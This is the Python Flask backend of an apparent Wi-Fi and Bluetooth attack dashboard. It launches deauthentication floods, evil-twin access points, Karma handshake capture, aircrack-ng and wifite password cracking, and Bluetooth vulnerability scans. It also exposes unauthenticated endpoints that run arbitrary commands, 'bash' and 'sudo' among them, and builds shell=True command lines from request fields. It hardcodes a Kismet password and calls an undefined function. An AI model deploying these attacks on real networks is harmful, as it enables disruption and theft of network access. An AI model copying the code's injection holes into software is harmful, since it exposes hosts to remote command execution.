import json, subprocess, time, shlex, signal
import re  
import os
from flask import Flask, jsonify, request, send_from_directory, Response, stream_with_context
from flask_cors import CORS
from typing import Dict
from functools import lru_cache

@lru_cache(maxsize=1024)
def lookup_vendor(mac):
    """Look up vendor information using manuf"""
    try:
        result = subprocess.run(['manuf', mac], capture_output=True, text=True)
        if result.returncode == 0 and result.stdout:
            vendor = result.stdout.strip()
            if vendor and vendor != "Unknown":
                return vendor
    except Exception as e:
        return "Unknown"

from kismet_interface import KismetInterface
from bluetooth_interface import BluetoothInterface
from network_utils import get_interfaces, start_kismet

# Constants
KISMET_HOST = "http://localhost:2501"
KISMET_USERNAME = "sechorda"
KISMET_PASSWORD = "kismet"

# Initialize Flask app and interfaces
app = Flask(__name__, static_folder='frontend', static_url_path='')
import logging
class NetworksFilter(logging.Filter):
    def filter(self, record):
        return not record.getMessage().startswith('127.0.0.1 - - ') or '/api/networks' not in record.getMessage()

log = logging.getLogger('werkzeug')
log.addFilter(NetworksFilter())
CORS(app)
kismet = KismetInterface(KISMET_HOST, KISMET_USERNAME, KISMET_PASSWORD)
bluetooth = BluetoothInterface()

# Store active audit processes
audit_processes = {}

@app.route('/')
def root():
    return send_from_directory(app.static_folder, 'index.html')

@app.route('/cracked.txt')
def serve_cracked_txt():
    return send_from_directory(os.getcwd(), 'cracked.txt')

@app.route('/api/check-file')
def check_file():
    path = request.args.get('path')
    if not path:
        return jsonify({'error': 'Path parameter required'}), 400
    
    # Handle glob patterns (e.g., *SSID.pcap)
    if '*' in path:
        import glob
        matches = glob.glob(path)
        return jsonify({'exists': len(matches) > 0})
    
    return jsonify({'exists': os.path.exists(path)})

@app.route('/api/bluetooth')
def get_bluetooth_devices():
    return jsonify(bluetooth.scan_devices())

@app.route('/api/bluetooth/vulnscan/<mac_address>')
def bluetooth_vulnscan(mac_address):
    action = request.args.get('action')
    
    if action == 'continue':
        # Send 'continue' to the existing process
        process = bluetooth.scan_processes.get(mac_address)
        if not process:
            return jsonify({'error': 'No active scan process found'}), 404
        try:
            process.stdin.write('continue\n')
            process.stdin.flush()
            # Return a generator to continue reading output
            def continue_reading():
                while True:
                    output = process.stdout.readline()
                    if output == '' and process.poll() is not None:
                        break
                    if output:
                        print(output, end='', flush=True)
                        yield output
            return Response(stream_with_context(continue_reading()), mimetype='text/plain')
        except Exception as e:
            return jsonify({'error': f'Failed to send continue: {str(e)}'}), 500
    
    # Start new scan
    generator = bluetooth.run_vulnerability_scan(mac_address)
    if not generator:
        return jsonify({'error': 'Failed to start vulnerability scan'}), 500
    return Response(stream_with_context(generator), mimetype='text/plain')

@app.route('/api/bluetooth/report/<mac_address>')
def bluetooth_report(mac_address):
    report = bluetooth.get_scan_report(mac_address)
    if not report:
        return jsonify({'error': 'Failed to get scan report'}), 404
    return jsonify(report)

@app.route('/api/bluetooth/recon/<mac_address>/check')
def check_recon_files(mac_address):
    recon_dir = f'/usr/share/BlueToolkit/data/tests/{mac_address}/recon'
    try:
        if not os.path.exists(recon_dir):
            return jsonify(None), 404
            
        results = {}
        for file in os.listdir(recon_dir):
            if file.endswith('.log') and file != 'hciinfo.log':
                with open(os.path.join(recon_dir, file), 'r') as f:
                    results[file] = f.read()
        return jsonify(results) if results else (jsonify(None), 404)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/bluetooth/recon', methods=['POST'])
def run_recon():
    mac_address = request.json.get('address')
    if not mac_address:
        return jsonify({'error': 'MAC address required'}), 400
        
    try:
        # Run bluekit recon command
        cmd = ['sudo', 'bluekit', '-r', mac_address]
        process = subprocess.run(cmd, capture_output=True, text=True)
        
        if process.returncode != 0:
            return jsonify({'error': 'Recon command failed', 'output': process.stderr}), 500
            
        # Read and return results
        recon_dir = f'/usr/share/BlueToolkit/data/tests/{mac_address}/recon'
        results = {}
        for file in os.listdir(recon_dir):
            if file.endswith('.log') and file != 'hciinfo.log':
                with open(os.path.join(recon_dir, file), 'r') as f:
                    results[file] = f.read()
                    
        return jsonify(results)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/networks')
def get_networks():
    return jsonify(kismet.get_devices())

@app.route('/api/interfaces')
def get_interface_info():
    interfaces = get_interfaces()
    return jsonify({
        'interfaces': interfaces['wifi'],  # Keep backward compatibility
        'wifi_interfaces': interfaces['wifi'],
        'bluetooth_interfaces': interfaces['bluetooth'],
        'ethernet_interfaces': interfaces['ethernet'],
        'active_interface': kismet.get_active_interface(),
        'timestamp': time.time()
    })

@app.route('/api/execute', methods=['POST'])
def execute_command():
    try:
        command = request.json.get('command', '').split()[0]
        if command not in ['ifconfig', 'iwconfig', 'airmon-ng', 'airodump-ng', 'uname', 'bash', 'sudo']:
            return 'Command not allowed', 403
        result = subprocess.run(request.json['command'].split(), capture_output=True, text=True, input='<UP>\n', encoding='utf-8')
        return jsonify({
            'stdout': result.stdout,
            'stderr': result.stderr,
            'returncode': result.returncode
        })
    except Exception as e:
        return str(e), 500

@app.route('/api/execute/stream', methods=['GET'])
def stream_command_output():
    command = request.args.get('command')
    if not command:
        return jsonify({'error': 'Command required'}), 400

    process = subprocess.Popen(
        command.split(),
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE,
        text=True,
        bufsize=1,
        universal_newlines=True
    )

    def generate():
        try:
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    yield f"data: {json.dumps({'text': output.strip()})}\n\n"
        finally:
            process.stdout.close()
            process.wait()

    return Response(generate(), mimetype='text/event-stream')

@app.route('/api/create-evil-twin', methods=['POST'])
def create_evil_twin():
    try:
        ssid = request.json.get('ssid')
        wifi_interface = request.json.get('wifi_interface')
        wan_interface = request.json.get('wan_interface')

        if not ssid or not wifi_interface or not wan_interface:
            return jsonify({'error': 'SSID, WIFI interface, and WAN interface are required'}), 400

        command = f'sudo mitmrouter up {wifi_interface} {wan_interface} "{ssid}"'
        process = subprocess.Popen(
            command.split(),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True
        )

        audit_processes[ssid] = process  # Use ssid from request.json

        def generate():
            try:
                while True:
                    output = process.stdout.readline()
                    if output == '' and process.poll() is not None:
                        break
                    if output:
                        print(output.strip())  # Output to CLI/terminal
            finally:
                process.stdout.close()
                process.wait()
                if ssid in audit_processes:
                    del audit_processes[ssid]

        return jsonify({'status': 'Evil-twin creation started'}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/deauth', methods=['POST'])
def deauth_client():
    try:
        # Get request parameters
        ap_mac = request.json.get('ap_mac')  # AP MAC when deauthing specific client
        channel = request.json.get('channel')  # Channel number from Kismet data
        client_mac = request.json.get('target_mac')  # Client MAC if deauthing specific client
        mac_24ghz = request.json.get('mac_24ghz')  # 2.4GHz MAC from device label
        mac_5ghz = request.json.get('mac_5ghz')    # 5GHz MAC from device label
        is_broadcast = request.json.get('is_broadcast', False)  # Flag for broadcast deauth
        band = request.json.get('band')  # Band selection for deauth

        # Determine deauth type and set parameters
        if ap_mac is not None:  # Client deauth
            if not client_mac:
                return jsonify({'error': 'Client MAC address is required when AP MAC is provided'}), 400
            target_mac = client_mac
            
            # Make sure we have channel information for client deauth
            if not channel:
                return jsonify({'error': 'Channel is required for client deauth'}), 400

        elif is_broadcast:  # Broadcast deauth
            if not band:
                return jsonify({'error': 'Band selection is required for broadcast deauth'}), 400
            
            # Set channel based on selected band
            channel = '1' if band == '2.4GHz' else '36'  # Default channels for each band
            target_mac = 'FF:FF:FF:FF:FF:FF'  # Broadcast address
            
        else:  # AP deauth
            # For AP deauth, we need band selection to determine which MAC to use
            if not band:
                return jsonify({'error': 'Band selection is required for AP deauth'}), 400

            # Select MAC and channel based on band
            if band == '2.4GHz':
                if not mac_24ghz:
                    return jsonify({'error': 'No 2.4GHz MAC address available for this AP'}), 400
                target_mac = mac_24ghz
                channel = '1'  # Default 2.4GHz channel
            else:  # 5GHz
                if not mac_5ghz:
                    return jsonify({'error': 'No 5GHz MAC address available for this AP'}), 400
                target_mac = mac_5ghz
                channel = '36'  # Default 5GHz channel

        # Get interfaces and prioritize monitor mode interface
        interfaces = get_interfaces()
        wifi_interfaces = interfaces.get('wifi', [])
        
        # First try to find a monitor mode interface (ending with 'mon')
        monitor_interfaces = [iface for iface in wifi_interfaces if iface.endswith('mon')]
        if monitor_interfaces:
            wifi_interface = monitor_interfaces[0]  # Use the first monitor interface found
        else:
            # Fall back to getting active interface from Kismet
            wifi_interface = kismet.get_active_interface()
            
        if not wifi_interface:
            return jsonify({'error': 'No suitable interface found'}), 500

        print("\n=== DEAUTH REQUEST DEBUG ===")
        print(f"Request JSON: {request.json}")
        print(f"Kismet Interface: {wifi_interface}")
        print(f"Target MAC: {target_mac}")
        print(f"AP MAC: {ap_mac}")
        print(f"Channel: {channel}")
        print("===========================\n")

        # Set channel before starting deauth
        try:
            subprocess.run(['sudo', 'iwconfig', wifi_interface, 'channel', str(channel)], check=True)
            print(f"[DEBUG] Successfully set channel {channel}")
        except subprocess.CalledProcessError as e:
            error_msg = f'Failed to set channel {channel}: {str(e)}'
            print(f"[DEBUG] {error_msg}")
            return jsonify({'error': error_msg}), 500

        # Determine if we're deauthing a specific client or all clients from an AP
        if ap_mac:
            # Deauthing specific client (target_mac is client MAC, ap_mac is AP MAC)
            command = f'sudo aireplay-ng --deauth 0 -a {ap_mac} -c {target_mac} {wifi_interface}'
            print(f"[DEBUG] Deauthing specific client: {target_mac} from AP: {ap_mac}")
            process_key = f"deauth_{ap_mac}_{target_mac}"
        else:
            # Deauthing all clients from AP (target_mac is AP MAC)
            command = f'sudo aireplay-ng --deauth 0 -a {target_mac} {wifi_interface}'
            print(f"[DEBUG] Deauthing all clients from AP: {target_mac}")
            process_key = f"deauth_{target_mac}"

        print(f"[DEBUG] Executing command: {command}")
        
        # Kill any existing deauth process for this target
        if process_key in audit_processes:
            old_process = audit_processes[process_key]
            try:
                old_process.terminate()
                old_process.wait(timeout=2)
            except:
                try:
                    old_process.kill()
                except:
                    pass
            del audit_processes[process_key]
        
        # Start deauth process
        process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True,
            preexec_fn=os.setsid  # Use process group for proper cleanup
        )

        # Store process for cleanup
        audit_processes[process_key] = process

        def generate():
            try:
                while True:
                    output = process.stdout.readline()
                    if output == '' and process.poll() is not None:
                        break
                    if output:
                        print(f"[DEBUG] Deauth output: {output.strip()}")
                        print(output.strip())  # Print to console for debugging
                        yield f"data: {json.dumps({'type': 'output', 'text': output.strip()})}\n\n"
                        time.sleep(0.01)  # Minimal delay for faster updates while maintaining stability
            except Exception as e:
                print(f"[DEBUG] Error in deauth stream: {str(e)}")
                yield f"data: {json.dumps({'type': 'error', 'text': str(e)})}\n\n"
            finally:
                try:
                    # Kill the entire process group
                    os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                except:
                    pass
                process.stdout.close()
                process.wait()
                if process_key in audit_processes:
                    del audit_processes[process_key]

        return Response(generate(), mimetype='text/event-stream')
        
    except Exception as e:
        error_msg = f'Exception during deauth: {str(e)}'
        print(f"[DEBUG] {error_msg}")
        return jsonify({'error': error_msg}), 500

@app.route('/api/audit/stream/<ssid>')
def audit_stream(ssid):
    # Get the audit process for this SSID
    process = audit_processes.get(ssid)
    if not process:
        return jsonify({'error': 'No active audit process found'}), 404

    def generate():
        try:
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    output = output.strip()
                    print(output)  # Print to console for debugging
                    
                    # Check for cracked password in output
                    if "KEY FOUND!" in output:
                        psk = output.split("KEY FOUND!")[1].strip()
                        yield f"data: {json.dumps({'type': 'psk', 'psk': psk})}\n\n"
                    elif "Failed to crack handshake" in output:
                        yield f"data: {json.dumps({'type': 'output', 'text': 'Failed to crack handshake'})}\n\n"
                    elif "WPA Handshake capture: Listening" in output:
                        yield f"data: {json.dumps({'type': 'output', 'text': output})}\n\n"
                    elif "Captured handshake" in output:
                        yield f"data: {json.dumps({'type': 'output', 'text': output})}\n\n"
                    else:
                        # Send regular output
                        yield f"data: {json.dumps({'type': 'output', 'text': output})}\n\n"
        finally:
            process.stdout.close()
            process.wait()
            if ssid in audit_processes:
                del audit_processes[ssid]
            # Restart kismet to restore interface configuration
            start_kismet()

    return Response(stream_with_context(generate()), mimetype='text/event-stream')

@app.route('/api/audit', methods=['POST'])
def audit_network():
    try:
        ssid = request.json.get('ssid')
        if not ssid:
            return jsonify({'error': 'SSID required'}), 400

        # Get active interface from kismet before stopping it
        interface = kismet.get_active_interface()
        if not interface:
            return jsonify({'error': 'No active interface found'}), 400

        # Stop kismet to free up monitor interface
        subprocess.run(['sudo', 'killall', 'kismet'], check=True)
        time.sleep(2)  # Give kismet time to cleanup

        # Start wifite process with interface and kill option
        cmd = ['sudo', 'wifite', '--dict', './password_wordlist.txt', '-e', ssid, '-i', interface, '--kill']
        process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True
        )

        audit_processes[ssid] = process

        # Return success response after starting the process
        return jsonify({'status': 'ok'}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/mitmrouter/stream', methods=['POST'])
def stream_mitmrouter():
    try:
        # Get args array from request
        args = request.json.get('args')

        if not args or len(args) != 6:
            return jsonify({'error': 'Missing required arguments'}), 400

        def clean_network_param(param):
            if not param:
                return ''
            # Remove any existing quotes and escapes
            cleaned = param.strip().replace('"', '').replace("'", '').replace('\\', '')
            # Escape special characters
            return shlex.quote(cleaned)

        # Clean and escape the SSID and PSK from args
        # args[3] is SSID, args[5] is PSK
        args[3] = clean_network_param(args[3])  # SSID
        args[5] = clean_network_param(args[5])  # PSK

        # Create command with arguments in exact order
        command = ['sudo', 'mitmrouter'] + args
        print(f"Executing AP command: {' '.join(command)}")
            
        process = subprocess.Popen(
            command,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1,
            universal_newlines=True
        )

        # Extract SSID from args for process tracking
        process_ssid = args[3] if len(args) > 3 else None
        if process_ssid:
            audit_processes[process_ssid] = process
            print(f"Tracking process for SSID: {process_ssid}")

        def generate():
            try:
                while True:
                    output = process.stdout.readline()
                    if output == '' and process.poll() is not None:
                        break
                    if output:
                        yield f"data: {json.dumps({'text': output.strip()})}\n\n"
            finally:
                process.stdout.close()
                process.wait()
                # Clean up using SSID from args
                if process_ssid and process_ssid in audit_processes:
                    del audit_processes[process_ssid]
                    print(f"Cleaned up process for SSID: {process_ssid}")

        return Response(generate(), mimetype='text/event-stream')
    except Exception as e:
        return jsonify({'error': str(e)}), 500


def parse_probe_request(line):
    """Parse a tcpdump probe request line and extract relevant information"""
    try:
        # Extract timestamp
        timestamp_match = re.match(r'(\d{2}:\d{2}:\d{2}\.\d+)', line)
        if not timestamp_match:
            return None
        timestamp = timestamp_match.group(1)

        # Extract MAC address
        mac_match = re.search(r'SA:([0-9a-fA-F:]{17})', line)
        if not mac_match:
            return None
        mac = mac_match.group(1)
        
        # Look up vendor using manuf
        vendor = lookup_vendor(mac)

        # Extract SSID
        ssid_match = re.search(r'Probe Request \(([^)]*)\)', line)
        if not ssid_match:
            return None
        ssid = ssid_match.group(1).strip()

        return {
            'timestamp': timestamp,
            'mac': mac,
            'vendor': vendor,
            'ssid': ssid or 'Broadcast'
        }
    except Exception as e:
        return None

@app.route('/api/probe-monitor/stream')
def stream_probe_monitor():
    """Stream parsed probe request data using tcpdump"""
    try:
        # Get active interface from kismet and append mon for monitor mode
        base_interface = kismet.get_active_interface()
        if not base_interface:
            return jsonify({'error': 'No active interface found'}), 400

        # Append mon to use Kismet's monitor interface
        interface = f"{base_interface}mon"

        # Use tcpdump to monitor probe requests
        cmd = f'sudo tcpdump -U -l -e -vv -i {interface} type mgt subtype probe-req 2>&1'
        
        try:
            process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                universal_newlines=True,
                preexec_fn=os.setsid  # Use process group for proper cleanup
            )
            audit_processes['probe_monitor'] = process
        except Exception as e:
            return jsonify({'error': f'Failed to start tcpdump: {str(e)}'}), 500

        def generate():
            try:
                while True:
                    line = process.stdout.readline()
                    if not line or len(line.strip()) == 0:
                        continue
                    
                    line = line.strip()

                    # Skip header lines
                    if "listening on" in line or "tcpdump:" in line:
                        continue

                    # Parse the probe request data
                    parsed_data = parse_probe_request(line)
                    if parsed_data:
                        yield f"data: {json.dumps(parsed_data)}\n\n"
                        
            except Exception as e:
                pass
            finally:
                try:
                    os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                    process.wait(timeout=2)
                    if 'probe_monitor' in audit_processes:
                        del audit_processes['probe_monitor']
                except Exception as e:
                    pass
                    
        return Response(stream_with_context(generate()), mimetype='text/event-stream')
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/stop-mitmrouter', methods=['POST'])
def stop_mitmrouter():
    try:
        wifi_interface = request.json.get('wifi_interface')
        if not wifi_interface:
            return jsonify({'error': 'WIFI interface is required'}), 400

        command = f'sudo ifconfig {wifi_interface} down'
        subprocess.run(command.split(), check=True)

        return jsonify({'status': 'Interface brought down successfully'}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/reset-interface', methods=['POST'])
def reset_interface():
    try:
        interface = request.json.get('interface')
        if not interface:
            return jsonify({'error': 'Interface is required'}), 400

        # Bring the interface down
        command_down = f'sudo ifconfig {interface} down'
        subprocess.run(command_down.split(), check=True)

        # Bring the interface up
        command_up = f'sudo ifconfig {interface} up'
        subprocess.run(command_up.split(), check=True)

        return jsonify({'status': 'Interface reset successfully'}), 200
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/karma/audit', methods=['POST'])
def karma_audit_network():
    try:
        ssid = request.json.get('ssid')
        clients = request.json.get('clients', [])
        interface = request.json.get('interface')

        if not ssid or not interface:
            return jsonify({'error': 'SSID and interface are required'}), 400
            
        # Use empty array if clients is None
        clients = clients or []

        # Stop kismet to free up the interface
        subprocess.run(['sudo', 'killall', 'kismet'], check=True)
        time.sleep(1)  # Give kismet time to cleanup

        # For Karma audit, we specifically want to filter for the client MAC addresses
        # from the probe requests
        if clients:
            # Create a filter expression with just the first client MAC
            # Format based on provided example: sudo tcpdump -i wlp0s20f3 wlan addr3 80:60:b7:af:23:a1 -ddd > karma.bpf
            client_mac = clients[0].strip()
            
            # Create Berkeley Packet Filter with comprehensive MAC address matching
            cmd = f'sudo tcpdump -i {interface} "wlan addr1 {client_mac} or wlan addr2 {client_mac} or wlan addr3 {client_mac}" -ddd > karma.bpf'
            
            print(f"Executing karma BPF command: {cmd}")
        else:
            # Default filter to capture all probe requests for the given SSID
            cmd = f'sudo tcpdump -i {interface} type mgt subtype probe-req -ddd > karma.bpf'
            print(f"Using default probe request filter: {cmd}")
        
        # First execute tcpdump to create the BPF file
        tcpdump_process = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True
        )
        
        if tcpdump_process.returncode != 0:
            return jsonify({'error': f'Failed to create BPF filter: {tcpdump_process.stderr}'}), 500

        # Create filename with SSID and timestamp
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        pcap_file = f"{timestamp}-{ssid}.pcapng"
        
        # Now start hcxdumptool with the created BPF file and save to pcap
        hcxdump_cmd = f'sudo hcxdumptool -i {interface} --disable_deauthentication --exitoneapol=4 -w {pcap_file} --bpf=karma.bpf'
        print(f"Starting hcxdumptool: {hcxdump_cmd}")
        
        # Start process with combined stdout/stderr
        process = subprocess.Popen(
            hcxdump_cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,  # Combine stderr with stdout
            text=True,
            bufsize=0,  # Disable buffering
            universal_newlines=True,
            preexec_fn=os.setsid  # Use process group for proper cleanup
        )

        audit_processes[ssid] = process

        def generate():
            try:
                while True:
                    output = process.stdout.readline()
                    if output == '' and process.poll() is not None:
                        break
                    output = output.strip()
                    if output:  # Only yield non-empty lines
                        # Look for handshake capture line format: "HH:MM:SS   + MAC1 MAC2 SSID"
                        # Lines should match: "10:47:32   + 18421ddb71f1 a8032a8507ec SpectrumSetup-B8"
                        parts = output.strip().split()
                        if (len(parts) >= 4 and 
                            len(parts[0]) == 8 and  # HH:MM:SS
                            parts[0][2] == ':' and parts[0][5] == ':' and  # Time format
                            parts[1] == '+' and  # The + symbol
                            len(parts[2]) == 12 and  # First MAC (without colons)
                            len(parts[3]) == 12):  # Second MAC (without colons)
                            print(f"[DEBUG] Handshake captured: {output}")
                            yield f"data: {json.dumps({'type': 'handshakeCaptured', 'text': output})}\n\n"
                            
                            # Kill hcxdumptool after handshake capture
                            try:
                                os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                            except:
                                pass
                            
                            # Clean up karma.bpf file
                            try:
                                os.remove('karma.bpf')
                            except:
                                pass

                            # Restart kismet
                            start_kismet()
                            
                            # Convert pcapng to pcap using tcpdump
                            print(f"[DEBUG] Converting {pcap_file} to pcap format...")
                            
                            pcap_name = pcap_file.replace('.pcapng', '.pcap')
                            convert_cmd = f'sudo tcpdump -r {pcap_file} -w {pcap_name}'
                            convert_process = subprocess.run(
                                convert_cmd,
                                shell=True,
                                capture_output=True,
                                text=True
                            )
                            
                            if convert_process.returncode == 0:
                                print(f"[DEBUG] Successfully converted to {pcap_name}")
                                yield f"data: {json.dumps({'type': 'output', 'text': f'Converting capture to {pcap_name}'})}\n\n"
                                
                                # Try cracking with aircrack-ng
                                print(f"[DEBUG] Attempting to crack with aircrack-ng...")
                                yield f"data: {json.dumps({'type': 'output', 'text': 'Attempting to crack handshake...'})}\n\n"
                                
                                crack_cmd = f'sudo aircrack-ng {pcap_name} -w password_wordlist.txt -e {ssid}'
                                crack_process = subprocess.Popen(
                                    crack_cmd,
                                    shell=True,
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.STDOUT,
                                    text=True,
                                    bufsize=0,
                                    universal_newlines=True
                                )
                                
                                while True:
                                    crack_output = crack_process.stdout.readline()
                                    if crack_output == '' and crack_process.poll() is not None:
                                        break
                                    if crack_output:
                                        print(f"[DEBUG] Crack output: {crack_output.strip()}")
                                        yield f"data: {json.dumps({'type': 'output', 'text': crack_output.strip()})}\n\n"
                                        
                                        # Check for successful crack
                                        if "KEY FOUND!" in crack_output:
                                            psk_match = crack_output.split("KEY FOUND!")[1].strip()
                                            if psk_match:
                                                yield f"data: {json.dumps({'type': 'psk', 'psk': psk_match})}\n\n"
                            else:
                                print(f"[DEBUG] Failed to convert capture: {convert_process.stderr}")
                                yield f"data: {json.dumps({'type': 'error', 'text': 'Failed to convert capture file'})}\n\n"
                            
                            break
                        else:
                            print(f"[DEBUG] Karma audit output: {output}")
                            yield f"data: {json.dumps({'type': 'output', 'text': output})}\n\n"
            except Exception as e:
                print(f"[DEBUG] Error in karma audit stream: {str(e)}")
                yield f"data: {json.dumps({'type': 'error', 'text': str(e)})}\n\n"
            finally:
                try:
                    # Kill the entire process group
                    os.killpg(os.getpgid(process.pid), signal.SIGTERM)
                except:
                    pass
                process.stdout.close()
                process.wait()
                if ssid in audit_processes:
                    del audit_processes[ssid]
                
                # Clean up karma.bpf if it exists
                try:
                    os.remove('karma.bpf')
                except:
                    pass

                # Always ensure kismet is restarted
                if restart_networking():
                    start_kismet()

        return Response(stream_with_context(generate()), mimetype='text/event-stream')
    except Exception as e:
        return jsonify({'error': str(e)}), 500
